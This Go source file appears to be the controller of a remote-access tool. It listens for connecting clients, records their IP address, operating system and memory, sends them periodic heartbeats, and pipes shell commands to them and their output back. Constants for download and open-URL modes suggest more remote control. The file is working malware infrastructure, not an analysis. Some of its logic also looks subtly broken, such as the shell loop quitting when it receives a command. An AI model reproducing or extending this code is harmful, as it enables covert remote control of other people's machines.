package main

import (
	"fmt"
	"github.com/fananchong/cstruct-go"
	"net"
	"strings"
	"time"
	"unsafe"
)

const SERVER_HEARTS = 0
const SERVER_SHELL = 2
const SERVER_DOWNLOAD = 4
const SERVER_OPENURL = 8
const SERVER_SYSTEMINFO = 10

type CMSG struct {
	sign  [10]byte
	mod   uint8
	msg_l uint8
}

func listen(port string) {
	defer func() {
		tcpConn = false // TCP功能下线了
	}()
	fmt.Println("Starting the server ...")
	// 创建 listener
	listener, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println("Error listening", err.Error())
		return //终止程序
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting", err.Error())
			return // 终止程序
		}
		go doServerStuff(conn)
		tcpConn = true
	}
}

// 心跳包线程池和解决首次接入
func doServerStuff(conn net.Conn) {
	for {

		if _, ok := serverMap[conn]; !ok {
			//第一次运行
			buf := make([]byte, unsafe.Sizeof(CMSG{}))
			l, err := conn.Read(buf)
			if err != nil {
				fmt.Println("Error reading Code:", l, err.Error())
				return
			}
			var msg *CMSG = *(**CMSG)(unsafe.Pointer(&buf))
			fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)
			if string(msg.sign[:]) == "customize\x00" {
				if msg.msg_l != 0 && msg.mod == SERVER_SYSTEMINFO { // 是第一次登陆带有系统信息的包
					buf := make([]byte, msg.msg_l)
					l, err := conn.Read(buf)
					if err != nil {
						fmt.Println("Error reading in inline read:", l, err.Error())
						_ = conn.Close() // 第一次接收就GG了，完全没必要再鸟他了
						return
					}
					fmt.Println(string(buf[:]))
					sp := strings.Split(string(buf[:]), "\n")
					if len(sp) == 3 {
						serverMap[conn] = S{
							memory: sp[2],
							OS:     sp[1],
							ip:     sp[0],
							status: SERVER_HEARTS,
						}
						fmt.Println(sp[0], sp[1], sp[2])
					} else {
						serverMap[conn] = S{
							memory: "unknown",
							OS:     "unknown",
							ip:     "unknown",
							status: SERVER_HEARTS,
						}
					}

				}
			}
			Handle(conn, SERVER_HEARTS)
		} else {
			s := serverMap[conn]
			if s.status == SERVER_HEARTS {
				buf := make([]byte, unsafe.Sizeof(CMSG{}))
				l, err := conn.Read(buf)
				if err != nil {
					fmt.Println("Error reading Code:", l, err.Error())
					_ = conn.Close()
					delete(serverMap, conn) //因为这个不是第一次，所以conn肯定会在表里，得删除
					return
				}
				var msg *CMSG = *(**CMSG)(unsafe.Pointer(&buf))
				fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)

				time.Sleep(10 * time.Second)
				Handle(conn, SERVER_HEARTS) // 十秒一次心跳包
			} else {
				//其他操作中，暂时停止
				time.Sleep(10 * time.Second)
			}
		}

	}
}
func tlLoadMsg(code int, l int) CMSG {
	var lSign [10]byte
	bSign := []byte(sign)
	for i := 0; i < 10; i++ {
		if i >= len(bSign) {
			lSign[i] = byte(0)
		} else {
			lSign[i] = bSign[i]
		}

	}
	msg := CMSG{
		sign:  lSign,
		mod:   uint8(code),
		msg_l: uint8(l),
	}
	return msg
}

// 主动接管
func Handle(conn net.Conn, code int) {
	switch code {
	case SERVER_HEARTS:
		s := serverMap[conn]
		s.status = SERVER_HEARTS
		msg := tlLoadMsg(SERVER_HEARTS, 0)
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil {
			// do something

			return
		}
		fmt.Println("Send Data:", l)
		return
	case SERVER_SHELL:
		s := serverMap[conn]
		s.status = SERVER_SHELL
		msg := tlLoadMsg(SERVER_SHELL, 0)
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil || l == 0 {
			// do something
			s.status = SERVER_HEARTS
			return
		}
		go func() {
			for {
				shell, ok := <-shellInChan
				if ok {
					s.status = SERVER_HEARTS
					return
				}
				l, err := conn.Write([]byte(shell))
				if err != nil || l == 0 {
					s.status = SERVER_HEARTS
					return
				}
				if shell == "reset" {
					s.status = SERVER_HEARTS
					return
				}
			}
		}()
		go func() {
			for {
				buf := make([]byte, 1024)
				l, err := conn.Read(buf)
				if err != nil || l == 0 {
					s.status = SERVER_HEARTS
					return
				}
				if string(buf[:]) == "reset" {
					s.status = SERVER_HEARTS
					return
				}
				shellOutChan <- string(buf[:])
			}
		}()

	}
}
